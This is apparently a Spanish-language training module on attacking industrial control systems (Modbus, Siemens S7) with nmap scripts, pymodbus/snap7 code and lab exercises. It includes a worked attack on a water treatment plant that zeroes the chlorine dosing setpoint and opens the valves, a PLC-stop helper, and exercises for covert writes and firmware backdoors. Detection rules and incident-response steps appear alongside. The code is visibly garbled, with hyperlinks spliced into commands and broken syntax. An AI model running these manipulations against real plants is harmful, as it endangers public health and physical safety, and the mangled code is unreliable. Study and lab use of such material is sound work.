# ot/scada — Sistemas Industriales y OT (Operational Technology)

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (1744 lineas)


### 5.4 [nmap](../raw/nm4p.md) NSE para Modbus

`ash
# Descubrimiento de dispositivos Modbus
nmap -p 502 --script modbus-discover 192.168.1.0/24

# Enumeración de Unit ID
nmap -p 502 --script modbus-enum --script-args='modbus-enum.unit=0' 192.168.1.100

# Todos los scripts Modbus
nmap -p 502 --script "modbus-*" 192.168.1.100

# Escaneo multi-protocolo) OT
nmap -p 502,102,20000,44818,4840,47808 --script "modbus-*,s7-info*" 192.168.1.0/24
`

### 5.5 ModbusPal - Simulador

ModbusPal es un simulador Java para practicar ataques Modbus.

`ash
# Descargar e iniciar
wget httpss)://sourceforge.net/projects/modbuspal/files/ModbusPal.jar
java -jar ModbusPal.jar
`

**Configuración de laboratorio:**
1. File → New Project
2. Add Slave → [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) Slave → [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip): 192.168.1.100:502
3. Right-click slave → Add Holding Registers: 100 regs (R0-R99)
4. Add Coils: 50 coils (C0-C49)
5. Add Input Registers: 50 regs
6. Add Discrete Inputs: 25 inputs
7. Project → Start

**[scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) con JavaScript para simulación dinámica:**

`javascript
// Simular tanque con nivel, bomba y alarma
function animate { var level = getRegister(0); // R0 = nivel actual var setpoint = getRegister(1); // R1 = setpoint var pump = getCoil(0); // C0 = bomba var valve = getCoil(1); // C1 = válvula de salida // Simular llenado si bomba activa if (pump && level < 100) { setRegister(0, level + 2); } // Simular vaciado si válvula abierta if (valve && level > 0) { setRegister(0, level - 1); } // Alarma si nivel > 95% setCoil(10, level > 95); // Actualizar input register para sensor setInputRegister(0, getRegister(0);
}

setInterval(animate, 500);
`

### 5.6 Modbus RTU (Serial)

`ash
# Identificar puerto serie
ls /dev/ttyUSB* /dev/ttyACM*

# Con parámetros: 9600 baud, 8N1
stty -F /dev/ttyUSB0 9600 cs8 -cstopb -parenb

# Escanear con modbus-cli sobre serial
modbus -r -p /dev/ttyUSB0 -b 9600 1 0 10

# En Windows con com port
# Usar pymodbus con ModbusSerialClient
`

`python
from pymodbus.client import ModbusSerialClient

client = ModbusSerialClient( method='rtu', port='/dev/ttyUSB0', baudrate=9600, bytesize=8, parity='N', stopbits=1, timeout=1
)
client.connect
result = client.read_holding_registers(0, 10, unit=1)
if not result.isError: print(f"Registros: {result.registers}")
client.close
`

**Conversión RTU a TCP con ser2net:**

`ash
# Instalar ser2net
apt install ser2net

# Configurar /etc/ser2net.yaml
# Puerto 5020 mapea a /dev/ttyUSB0, 9600 8N1
define: &con485 accepter: tcp,5020 enable: true connector: serialdev, /dev/ttyUSB0, 9600n81, local

# Conectar
[nc](../raw/r3v3rs3-sh3lls.md#netcat) 127.0.0.1 5020
`

### 5.7 Unit ID y Broadcast

**Unit ID Scan:** Escanear Unit [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips))) 1-247 en paralelo.

`python
from pymodbus.client import ModbusTcpClient
from concurrent.futures import ThreadPoolExecutor, as_completed

def check_unit(host, port, uid, timeout=2): try: c = ModbusTcpClient(host, port=port, timeout=timeout) c.connect r = c.read_holding_registers(0, 1, unit=uid) if not r.isError: return uid c.close except: pass return None

def scan_units(host, port=502): print(f"Escaneando Unit IDs en {host}:{port}..") found = with ThreadPoolExecutor(max_workers=30) as ex: futures = {ex.submit(check_unit, host, port, u): u for u in range(1, 248)} for f in as_completed(futures): r = f.result if r: found.append(r) print(f"  [+] Unit ID {r}") print(f"Total: {len(found)} Unit IDs") return found

scan_units("192.168.1.100")
`

**Broadcast (Unit ID = 0):** En Modbus RTU, dirección 0 = broadcast. Todos los esclavos procesan pero no responden.

`python
# Unit ID 0 = broadcast (no espera respuesta)
client.write_coil(0, True, unit=0)  # Todas las bobinas coil 0 = ON
client.write_register(0, 0, unit=0) # Todos los registros addr 0 = 0
`

### 5.8 Custom NSE Script para Modbus Write

`lua
-- modbus-write.nse
-- Uso: nmap -p 502 --script modbus-write --script-args 'addr=100,val=0'

local modbus = require "modbus"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"

description = "Escribe un valor en registro holding Modbus"
author = "[ot](../raw/0t-sc4d4.md) Hacker"
categories = {"[exploit](../raw/m3t4spl01t.md#exploits)", "safe"}
portrule = shortport.portnumber(502, "tcp")

action = function(host, port) local addr = tonumber(stdnse.get_script_args("addr") or 0 local val = tonumber(stdnse.get_script_args("val") or 0 local unit = tonumber(stdnse.get_script_args("unit") or 1 local helper = modbus.Helper:new(host, port) local status, result = helper:connect if not status then return stdnse.format_output(false, "No se pudo conectar") end local status, result = helper:writeSingleRegister(addr, val, unit) helper:close if status then return string.format("[+] R%d = %d", addr, val) else return string.format("[-] Error: %s", result) end
end
`

## 6. Explotación de Siemens S7

### 6.1 S7comm en Profundidad

**Estructura completa de paquete S7comm:**

`
Ethernet: MAC + [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) + [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) ([puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 102)
├─ TPKT: Version=3, Length
├─ COTP: PDU Type=0x03 (DT), EOT=1
└─ S7comm PDU: ├─ Protocol ID: 0x32 ├─ Message Type: 0x01=Job, 0x03=Ack-Data ├─ PDU Reference: 0x0001 ├─ Parameter Length ├─ Data Length ├─ Parameters: │  ├─ Function: 0x04 (Read) / 0x05 (Write) │  ├─ Item Count │  └─ Item: │ ├─ Specification │ ├─ Transport Size │ ├─ DB Number │ ├─ Area (0x81=PI, 0x82=PQ, 0x83=MK, 0x84=DB) │ └─ Offset (4 bytes) └─ Data (valores leídos/escritos)
`

**Return Codes:** 0xFF=OK, 0x03=Access Denied, 0x04=Invalid Address, 0x05=Data Not Found, 0x06=Not Implemented.

**S7-1200/1500 Security:**
- S7-1200 v1-v3: Sin seguridad
- S7-1200 v4+: Protección por contraseña en bloques
- S7-1500: S7comm-Plus ([cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)-like)
- [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades): S7comm tradicional sigue funcionando aunque el PLC tenga seguridad

### 6.2 Snap7 Library

`ash
pip install [python](../raw/pyth0n-f0r-h4ck1ng.md)-snap7
# Linux: apt install libsnap7-dev libsnap71
`

#### Conexión y API básica

`python
import snap7
from snap7 import util

class S7Hacker: def __init__(self, ip, rack=0, slot=1): self.ip = ip self.client = snap7.client.Client def connect(self): self.client.connect(self.ip, self.rack, self.slot, 102) if self.client.get_connected: print(f"[+] Conectado a {self.ip}") return True return False def get_info(self): info = self.client.get_cpu_info print(f"  Tipo: {info.ModuleTypeName.decode}") print(f"  Serial: {info.SerialNumber.decode}") print(f"  Nombre: {info.ModuleName.decode}") def get_state(self): state = self.client.get_cpu_state print(f"  Estado: {state}") return state def read_db_real(self, db, offset): data = self.client.read_area(snap7.types.areas.DB, db, offset, 4) return util.get_real(data, 0) if data else None def read_db_bool(self, db, byte_offset, bit_offset): data = self.client.read_area(snap7.types.areas.DB, db, byte_offset, 1) return util.get_bool(data, 0, bit_offset) if data else None def read_db_int(self, db, offset): data = self.client.read_area(snap7.types.areas.DB, db, offset, 2) return util.get_int(data, 0) if data else None def read_db_dint(self, db, offset): data = self.client.read_area(snap7.types.areas.DB, db, offset, 4) return util.get_dint(data, 0) if data else None def read_db_string(self, db, offset, max_len=254): data = self.client.read_area(snap7.types.areas.DB, db, offset, max_len+2) return util.get_string(data, 0, max_len) if data else None def write_db_real(self, db, offset, value): data = bytearray(4) util.set_real(data, 0, value) return self.client.write_area(snap7.types.areas.DB, db, offset, data) def write_db_bool(self, db, byte_offset, bit_offset, value): data = self.client.read_area(snap7.types.areas.DB, db, byte_offset, 1) if data: util.set_bool(data, 0, bit_offset, value) return self.client.write_area(snap7.types.areas.DB, db, byte_offset, data) return False def write_db_int(self, db, offset, value): data = bytearray(2) util.set_int(data, 0, value) return self.client.write_area(snap7.types.areas.DB, db, offset, data) def read_input(self, byte_off, bit_off): data = self.client.read_area(snap7.types.areas.[pe](../raw/w1n-1nt3rn4ls.md#pe), 0, byte_off, 1) return util.get_bool(data, 0, bit_off) if data else None def write_output(self, byte_off, bit_off, value): data = self.client.read_area(snap7.types.areas.PA, 0, byte_off, 1) if data: util.set_bool(data, 0, bit_off, value) return self.client.write_area(snap7.types.areas.PA, 0, byte_off, data) return False def read_flag(self, byte_off, bit_off): data = self.client.read_area(snap7.types.areas.MK, 0, byte_off, 1) return util.get_bool(data, 0, bit_off) if data else None def write_flag(self, byte_off, bit_off, value): data = self.client.read_area(snap7.types.areas.MK, 0, byte_off, 1) if data: util.set_bool(data, 0, bit_off, value) return self.client.write_area(snap7.types.areas.MK, 0, byte_off, data) return False def db_get_size(self, db_num): return self.client.db_get_size(db_num) def db_get_all(self, db_num): sz = self.db_get_size(db_num) return self.client.read_area(snap7.types.areas.DB, db_num, 0, sz) def list_blocks(self): return self.client.list_blocks def upload_block(self, blk_type, blk_num): return self.client.upload(blk_type, blk_num) def download_block(self, block_data): return self.client.download(block_data) def plc_stop(self): print("[!] DETENIENDO PLC!") self.client.plc_stop return self.get_state def plc_start(self): print("[*] Iniciando PLC..") self.client.plc_start return self.get_state def disconnect(self): self.client.disconnect print("[*] Desconectado")

## 11. Casos Prácticos

### 11.1 Ataque a Planta de Tratamiento de Agua

**Entorno:**
- PLC Schneider M340 (192.168.1.100:502)
- HMI Vijeo Citect (192.168.1.50)
- [scada](../raw/0t-sc4d4.md) remoto vía [vpn](../raw/4n0n1m4t0.md#vpn) (10.0.0.0/8)
- [red](../raw/r3d3s-f0nd4m3nt0s.md) [ot](../raw/0t-sc4d4.md): 192.168.1.0/24
- Red IT: 10.0.0.0/8
- DMZ OT: 172.16.0.0/24

**Fase 1: [reconocimiento](../raw/0s1nt.md#reconocimiento)](**

`ash
# Escaneo inicial
[nmap](../raw/nm4p.md) -sn 192.168.1.0/24

# Descubrimiento OT
nmap -p 502,102,20000,44818 192.168.1.0/24 --script modbus-discover

# Resultados:
# 192.168.1.100:502 - Modbus - Unit ID 1 - Info: Schneider M340
# 192.168.1.150:502 - Modbus - Unit ID 1 - Info: Modicon Premium
# 192.168.1.200:102 - S7 - S7-1200
`

**Fase 2: Enumeración**

`python
from pymodbus.client import ModbustcpClient

c = ModbusTcpClient("192.168.1.100")
c.connect

# Leer todo el mapa de memoria
print("=== Holding Registers 0-500 ===")
for i in range(0, 500, 50): regs = c.read_holding_registers(i, min(50, 500-i).registers for j, v in enumerate(regs): addr = i + j print(f"R{addr:04d} = {v} (0x{v:04X})")

# Identificar:
# R0: Nivel de tanque (0-100%)
# R1: setpoint de nivel (70%)
# R2: Presión de salida (bar)
# R3: Caudal de salida (L/min)
# R10: Cloro residual (ppm)
# R11: Setpoint de cloro (2.0 ppm)
# R100: Estado de bombas (bitmask)

c.close
`

**Fase 3: Explotación - Modificación de dosificación de cloro**

`python
c = ModbusTcpClient("192.168.1.100")
c.connect

# Modificar setpoint de cloro a 0 (desactivar dosificación)
print("[!] Desactivando dosificación de cloro..")
c.write_register(11, 0)

# Verificar
r = c.read_holding_registers(11, 1).registers
print(f"Cloro setpoint: {r[0]} ppm")

# Modificar setpoint de nivel de tanque
print("[!] Bajando setpoint de nivel de tanque..")
c.write_register(1, 10)  # Bajar a 10%

# Abrir válvulas de salida
print("[!] Abriendo válvulas de salida..")
c.write_coil(0, True) # Válvula principal
c.write_coil(1, False)  # By-pass

c.close
`

**Fase 4: [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)](w1nd0ws**
- Modificar programa ladder vía Unity Pro
- Agregar lógica que ignora comandos del HMI
- Configurar comunicación a [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) externo

**Mitigaciones:**
- Segmentación de red ([firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) entre niveles)
- Monitoreo de writes inusuales en Modbus
- Data diode para datos de [proceso](../raw/0s-f0nd4m3nt0s.md#procesos)
- Lista blanca de [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) que pueden escribir
- Detección de cambios en programa de PLC

### 11.2 Ransomware en Entorno OT

**Escenario:**
Ransomware infecta estaciones de ingeniería y servidores SCADA en Nivel 2/Nivel 3, cifrando HMIs y servidores.

**Impacto:**
- Operadores pierden visibilidad del proceso
- PLCs siguen funcionando en modo autónomo (últimos valores)
- No pueden modificar setpoints ni [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) a alarmas
- Potencial daño físico si el proceso se desvía

**Respuesta:**

`ash
# 1. AISLAR - Desconectar red OT de IT
# Cortar conexiones de DMZ
iptables -A FORWARD -i eth0 -j DROP

# 2. VERIFICAR PLCs
# Conectar directamente a PLCs (bypass HMI/SCADA)
[python](../raw/pyth0n-f0r-h4ck1ng.md)
>>> from pymodbus.client import ModbusTcpClient
>>> c = ModbusTcpClient("192.168.1.100")
>>> c.connect
>>> print(c.read_holding_registers(0, 10).registers)
>>> # Verificar que PLC está en RUN

# 3. MONITOREO MANUAL
# Establecer monitoreo directo desde laptop
# Usar ModbusPoll o script Python para monitorear

# 4. RECUPERACIÓN
# Reconstruir HMIs desde backups inmutables
# Instalar parches
# Mejorar segmentación

# 5. FORENSIA
# Preservar discos de servidores afectados
# Capturar memoria RAM
# Analizar muestras de ransomware
`

### 11.3 Exfiltración de Datos desde PLC

**Escenario:**
Atacante modifica programa de PLC para enviar datos de producción a un servidor externo.

`python
# Código malicioso que atacante inyecta en PLC
# (Concepts de lógica ladder modificada)

# El PLC originalmente solo responde a polls del SCADA
# El atacante agrega función que envía datos vía Modbus
# a una IP externa

# Detección:
# 1. Comunicaciones salientes inusuales desde red OT
tshark -i eth0 -Y "[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip).dst != 192.168.1.0/24 and modbus"

# 2. Checksum del programa de PLC diferente
# Comparar con backup conocido

# 3. Tamaño de bloque modificado
# Un OB1 modificado suele tener tamaño diferente

# 4. Nuevas conexiones TCP desde PLC
# (los PLCs normalmente solo responden, no inician conexiones)
[tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump) -i eth0 "[tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)[13] & 2 != 0 and not [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp)"  # SYN packets
`

## 12. Ejercicios Prácticos

### Laboratorio 1: setup de Entorno [ot](../raw/0t-sc4d4.md) Virtual

**Objetivo:** Crear un laboratorio virtual con PLCs simulados para practicar.

`ash
# === SETUP DEL LABORATORIO ===

# 1. Instalar dependencias
pip install pymodbus [python](../raw/pyth0n-f0r-h4ck1ng.md)-snap7 modbus-cli pycomm3

# 2. Crear PLC Modbus simulado
cat > plc_modbus_sim.py << 'EOF'
from pymodbus.server import StarttcpServer
from pymodbus.datastore import Modbussl)aveContext, ModbusServerContext
from pymodbus.datastore import ModbusSequentialDataBlock
import threading, time, random

# Crear datastore con datos iniciales
store = ModbusSlaveContext( zero_mode=True, di=ModbusSequentialDataBlock(0, [0]*100), co=ModbusSequentialDataBlock(0, [0]*100), hr=ModbusSequentialDataBlock(0, [0]*1000), ir=ModbusSequentialDataBlock(0, [0]*100)
)

# Valores iniciales de proceso
store.setValues(3, 0, [50]) # R0 = 50% nivel tanque
store.setValues(3, 1, [70]) # R1 = 70% setpoint
store.setValues(3, 2, [25]) # R2 = 25 bar presión
store.setValues(3, 3, [100]) # R3 = 100 L/min caudal
store.setValues(3, 10, [2.0])  # R10 = 2.0 ppm cloro

context = ModbusServerContext(slaves=store, single=True)

# Simular proceso
def simulate: while True: level = store.getValues(3, 0, 1)[0] setpoint = store.getValues(3, 1, 1)[0] pump = store.getValues(1, 0, 1)[0]  # C0 if pump and level < 100: store.setValues(3, 0, [min(level + 1, 100)]) elif not pump and level > 0: store.setValues(3, 0, [max(level - 2, 0)]) level = store.getValues(3, 0, 1)[0] alarm = 1 if level > 90 else 0 store.setValues(1, 10, [alarm]) time.sleep(1)

threading.Thread(target=simulate, daemon=True).start

# Iniciar servidor Modbus
print("[*] PLC Modbus simulado en 0.0.0.0:502")
print("[*] R0=Nivel, R1=Setpoint, C0=Bomba")
StartTcpServer(context, address=('0.0.0.0', 502)
EOF

python plc_modbus_sim.py
`

**Ejercicios del laboratorio:**
1. Conectar y leer registros 0-20
2. Identificar qué registros son de [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) vs configuración
3. Encender bomba (coil 0) y ver nivel subir
4. Modificar setpoint (R1) a diferentes valores
5. Capturar tráfico con tshark y analizarlo en [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark)
6. Escribir un script Python que monitoree el proceso

### Laboratorio 2: Escaneo y [reconocimiento](../raw/0s1nt.md#reconocimiento)](

**Objetivo:** Encontrar y enumerar dispositivos OT en la [red](../raw/r3d3s-f0nd4m3nt0s.md).

`ash
# 1. escaneo de puertoss) OT
[nmap](../raw/nm4p.md) -p 502,102,20000,44818,4840,47808 -sV -O 192.168.1.0/24

# 2. Descubrimiento específico de protocolos
nmap -p 502 --script modbus-discover 192.168.1.0/24
nmap -p 102 --script s7-info 192.168.1.0/24

# 3. Banner grabbing manual
echo -n '\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc1\x02\x01\x00\xc2\x02\x01\x01\xc0\x01\x0a' | [nc](../raw/r3v3rs3-sh3lls.md#netcat) -w 3 192.168.1.200 102 | xxd

# 4. Enumeración con modbus-cli
modbus -r -p 502 192.168.1.100 0 100

# 5. Identificar dispositivos por respuesta
# S7: Responde en puerto 102 con COTP
# Modbus: Responde en 502 con datos del esclavo
# DNP3: Responde en 20000
# CIP: Responde en 44818 con List Identity
`

**Tarea práctica:**
- Escanear toda la [subred](../raw/r3d3s-f0nd4m3nt0s.md#subredes)) 192.168.1.0/24
- Identificar qué hosts tienen puertos OT abiertos
- Para cada host, identificar el fabricante (por fingerprint)
- Mapear la red según el modelo Purdue

### Laboratorio 3: Explotación de Modbus

**Objetivo:** Manipular el PLC Modbus simulado.

`ash
# 1. Leer estado inicial
python << 'EOF'
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient("127.0.0.1")
c.connect

print("=== ESTADO INICIAL ===")
regs = c.read_holding_registers(0, 20).registers
coils = c.read_coils(0, 20).bits

print("Registros:")
for i, r in enumerate(regs): print(f"  R{i} = {r}")

print("\\nBobinas:")
for i, c_val in enumerate(coils): print(f"  C{i} = {'ON' if c_val else 'OFF'}")

c.close
EOF

# 2. Encender bomba
modbus -w -t coil -p 502 127.0.0.1 0 1

# 3. Verificar nivel sube
modbus -r -p 502 127.0.0.1 0 5

# 4. Modificar setpoint
modbus -w -p 502 127.0.0.1 1 50

# 5. Escribir múltiples registros
modbus -w -p 502 127.0.0.1 0 10 20 30 40 50
`

**Ejercicios:**
1. Escribir script que monitoree y detecte cambios en el PLC
2. Implementar un ataque que modifique el setpoint a un valor peligroso
3. Crear un script que haga escrituras encubiertas (escribir y restaurar)
4. Capturar el tráfico y analizar los function codes usados
5. Identificar qué registros son RO vs RW probando escrituras

### Laboratorio 4: Explotación Siemens S7

**Objetivo:** Conectarse y manipular un PLC Siemens virtual.

`ash
# 1. Preparar entorno S7 simulado
# Opción A: Usar S7 PLC real o Siemens PLCSIM
# Opción B: Usar snap7-server
python << 'SRVEOF'
import snap7, struct, threading, time

server = snap7.server.Server
server.start
print("[*] Servidor S7 simulado en [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 1102")

# Configurar área de DB1
db1_data = struct.pack('>ffffi??', 75.0, 72.5, 3.5, 150.0, 1200, True, False)
server.register_area(snap7.types.areas.DB, 1, db1_data)

try: while True: time.sleep(1)
except KeyboardInterrupt: server.stop
SRVEOF

# 2. Conectar y enumerar
python << 'EOF'
import snap7
from snap7 import util

client = snap7.client.Client
client.connect("127.0.0.1", 0, 1, 1102)

info = client.get_cpu_info
print(f"CPU: {info.ModuleTypeName}")

db1 = client.read_area(snap7.types.areas.DB, 1, 0, 20)
print(f"Temp: {util.get_real(db1, 0):.1f}°C")
print(f"Motor: {util.get_bool(db1, 16, 0)}")

client.disconnect
EOF
`

**Ejercicios:**
1. Conectar y obtener información de CPU
2. Leer todos los DBs encontrados
3. Modificar un valor REAL en DB
4. Detener e iniciar PLC
5. Extraer bloques de programa
6. Analizar paquetes S7comm con Wireshark

### Laboratorio 5: [firmware](../raw/u3f1-r00tk1ts.md#firmware) Extraction

**Objetivo:** Analizar y modificar firmware de un dispositivo embebido.

`ash
# 1. Crear firmware de prueba
# (simulado con sistema de archivos)
mkdir -p test_firmware/{sbin,etc,usr/bin,lib}
echo "version=1.0" > test_firmware/etc/version
echo "admin:admin123" > test_firmware/etc/passwd
echo "HMI Application v1.0" > test_firmware/sbin/hmi_app

# Empaquetar como squashfs
mksquashfs test_firmware/ test_fw.squash -comp xz

# Agregar header U-Boot falso
python -c "
import struct
with open('test_fw.squash', 'rb') as f: data = f.read
with open('firmware.bin', 'wb') as f: # U-Boot header f.write(b'U-Boot 2018.03') f.write(bytes(64) # [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) (dummy) f.write(b'\x00' * 1000) # Squashfs f.write(data)
"

# 2. Analizar firmware
binwalk firmware.bin

# 3. Extraer
binwalk -e firmware.bin

# 4. Modificar
cd _firmware.bin.extracted/
unsquashfs *.squashfs
cd squashfs-root/
echo "HACKED" > etc/version
sed -i 's/admin:admin123/admin:hacked_password/' etc/passwd

# 5. Re-empaquetar
mksquashfs squashfs-root/ modified.squash -comp xz
`

**Ejercicios:**
1. Analizar firmware real de [router](../raw/r3d3s-f0nd4m3nt0s.md#routers)/PLC (obtener uno legal para prácticas)
2. Identificar [sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos) y extraer
3. Modificar contraseña por defecto
4. Agregar servicio backdoor (telnet, SSH)
5. Re-empaquetar y verificar

### Laboratorio 6: Blue Team OT

**Objetivo:** Detectar ataques en entorno OT desde la perspectiva defensiva.

`ash
# 1. Configurar monitoreo de red OT
cat > monitor_ot.sh << 'EOF'
#!/bin/bash
PCAP="ot_monitor_.pcap"
INTERFACE="eth0"

echo "[*] Monitoreando .."

# Captura continua con rotación
[tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump) -i  -G 3600 -w "ot_%Y%m%d_%H%M%S.pcap" \ "port 502 or port 102 or port 20000 or port 44818"

# Captura en segundo plano
tcpdump -i  -w  &
PID=$!

# Análisis en tiempo real
while true; do echo "=== 05/24/2026 01:43:03 ===" echo "Paquetes OT en último minuto:" # Modbus writes echo "Modbus Writes:" tcpdump -r  -c 10 "port 502 and [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)[([tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)[12] & 0xf0) >> 2)+8]=5" 2>/dev/null # S7 Stops echo "S7 Stop Commands:" tcpdump -r  -c 5 "port 102" 2>/dev/null # DNP3 Operate echo "DNP3 Operate:" tcpdump -r  -c 5 "port 20000" 2>/dev/null sleep 60
done
EOF

# 2. Reglas de detección Snort/Suricata para OT
cat > ot_rules.rules << 'RULES'
# Modbus - Detectar escrituras
alert tcp any any -> any 502 (msg:"Modbus Write Single Coil"; content:"|00 05|"; offset:8; depth:1; sid:1000001;)
alert tcp any any -> any 502 (msg:"Modbus Write Register"; content:"|00 06|"; offset:8; depth:1; sid:1000002;)
alert tcp any any -> any 502 (msg:"Modbus Write Multiple Regs"; content:"|00 10|"; offset:8; depth:1; sid:1000003;)

# S7 - Detectar STOP
alert tcp any any -> any 102 (msg:"S7 PLC Stop"; content:"|32|"; offset:0; depth:1; content:"|29|"; sid:2000001;)

# S7 - Detectar Download
alert tcp any any -> any 102 (msg:"S7 Block Download"; content:"|32|"; offset:0; depth:1; content:"|1B|"; sid:2000002;)

# DNP3 - Detectar Operate
alert tcp any any -> any 20000 (msg:"DNP3 Direct Operate"; content:"|05 64|"; offset:0; depth:2; content:"|05|"; sid:3000001;)

# DNP3 - Detectar Cold Restart
alert tcp any any -> any 20000 (msg:"DNP3 Cold Restart"; content:"|05 64|"; offset:0; depth:2; content:"|1D|"; sid:3000002;)

# Conexiones no autorizadas a red OT
alert tcp !192.168.1.0/24 any -> 192.168.1.0/24 502 (msg:"Modbus from non-OT network"; sid:4000001;)
RULES

# 3. Script de detección de anomalías
python << 'ANOMALY'
from pymodbus.client import ModbusTcpClient
import time, statistics

class OTDDetector: def __init__(self, target): self.target = target self.baseline = {} self.client = ModbusTcpClient(target) def establish_baseline(self, registers=range(20), samples=10): """Establecer línea de base de valores normales""" print("Estableciendo línea de base..") for reg in registers: values = for _ in range(samples): r = self.client.read_holding_registers(reg, 1) if not r.isError: values.append(r.registers[0]) time.sleep(0.1) self.baseline[reg] = { 'mean': statistics.mean(values), 'stdev': statistics.stdev(values) if len(values) > 1 else 0 } print(f"  R{reg}: media={self.baseline[reg]['mean']:.1f}, " f"std={self.baseline[reg]['stdev']:.1f}") def check_anomalies(self, registers=range(20), threshold=3): """Detectar anomalías con threshold de desviación estándar""" anomalies = for reg in registers: r = self.client.read_holding_registers(reg, 1) if r.isError: continue val = r.registers[0] if reg in self.baseline: bl = self.baseline[reg] if bl['stdev'] > 0: z_score = abs(val - bl['mean']) / bl['stdev'] if z_score > threshold: anomalies.append(reg, val, z_score) return anomalies def monitor(self, duration=60): """Monitorear en tiempo real""" import datetime print(f"Monitoreando {self.target} por {duration}s..") start = time.time while time.time - start < duration: anomalies = self.check_anomalies if anomalies: print(f"[!] {datetime.datetime.now} - ANOMALÍAS:") for reg, val, z in anomalies: print(f"  R{reg} = {val} (z-score: {z:.1f})") time.sleep(1)

detector = OTDDetector("192.168.1.100")
detector.client.connect
detector.establish_baseline(range(20), 10)
detector.monitor(30)
detector.client.close
ANOMALY
`

## 13. Recursos y Referencias

### 13.1 Libros
- "Industrial Network Security, 2nd Edition" - Eric D. Knapp
- "Hacking Exposed: [industrial control systems](../raw/0t-sc4d4.md)" - Clint Bodungen
- "Applied Cyber Security and the Smart Grid" - Eric D. Knapp
- "[ics](../raw/0t-sc4d4.md) Security: The Purdue Model" - M. J. Habib
- "[scada](../raw/0t-sc4d4.md) Security: What's Broken and How to Fix It" - Graham Speake
- "Security of Industrial Control Systems and Cyber-Physical Systems" - adrien Bécue

### 13.2 Herramientas Open Source
- **ModbusPal:** Simulador Modbus
- **PLCinject:** Inyección de lógica en PLCs
- **ISF:** Industrial exploitation Framework
- **GRASSMARLIN:** Diagramación de [redes](../raw/r3d3s-f0nd4m3nt0s.md) [ot](../raw/0t-sc4d4.md)
- **Snap7:** Librería Siemens S7
- **pycomm3:** Librería Rockwell Cip
- **OpenOCD:** Debugging JTAG
- **flashrom:** Lectura/escritura de flash SPI
- **Binwalk:** Análisis de [firmware](../raw/u3f1-r00tk1ts.md#firmware)
- **s7scan:** Escáner Siemens S7
- **Modbus-cli:** Cliente Modbus por línea de comandos
- **pymodbus:** Librería Modbus [python](../raw/pyth0n-f0r-h4ck1ng.md)
- **S7Pocket:** Librería S7 en Go

### 13.3 Laboratorios Online
- **[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)-h4ckth3b0x.md#[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme)):** ICS/SCADA rooms, Attacking ICS Plant
- **[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox):** Máquinas OT (Sauna, Ready)
- **SANS ICS NetWars:** Laboratorio interactivo OT
- **Dragos Community:** Recursos y herramientas
- **ICS-CERT Virtual Training:** Laboratorios gratuitos
- **Cyber Range OT:** Varios proveedores

### 13.4 Comunidades
- /r/ICS_Security (reddit)
- /r/SCADA (Reddit)
- **InfraGard ICS Sector:** Comunidad FBI-sector privado
- **SANS ICS/SCADA Summit:** Conferencia anual
- **Dragos Community OT-IOC:** Threat intel colaborativo
- **ICS Village:** Comunidad de hacking OT (DEF CON)
- **OPCDAY / ICS Conference:** Conferencias OT
- **Troopers:** Conferencia alemana con track ICS

### 13.5 Certificaciones
- **GICSP:** Global Industrial Cyber Security Professional (SANS)
- **GRID:** GIAC Response and Industrial Defense (SANS)
- **ICS410:** ICS/SCADA Security Essentials (SANS)
- **ICS456:** Essentials for OT (SANS)
- **ICS515:** ICS Active Defense and Incident Response (SANS)
- **ISA/IEC 62443:** Cybersecurity Certificate Program
- **CISSP-ISSAP:** Information Systems Security Architecture Professional
- **CEH:** Certified Ethical Hacker (módulo OT)

### 13.6 Estándares y Regulaciones
- **ISA/IEC 62443:** Estándar de seguridad para IACS
- **[nist](../raw/p3nt3st-m3th0d0l0gy.md#nist) SP 800-82:** Guide to ICS Security
- **NERC CIP:** Critical Infrastructure Protection (sector eléctrico)
- **[iso 27001](../raw/l3g4l-c0mpl14nc3.md#iso-27001):** Con extensión ICS
- **[mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck) for ICS:** Matriz de tácticas OT
- **[owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) IoT:** Guías de seguridad para IoT industrial

### 13.7 Conferencias y Eventos
- **SANS ICS Security Summit:** Orlando + online
- **Troopers (Heidelberg):** Track ICS Security
- **OPCDAY:** Seguridad OPC/PLC
- **ICS Village (DEF CON):** Talleres prácticos
- **DragosCON:** Conferencia OT anual
- **rsaC ([rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa) Conference):** Track OT
- **BlackHat:** Arsenal de herramientas OT

### 13.8 Advertencia Ética

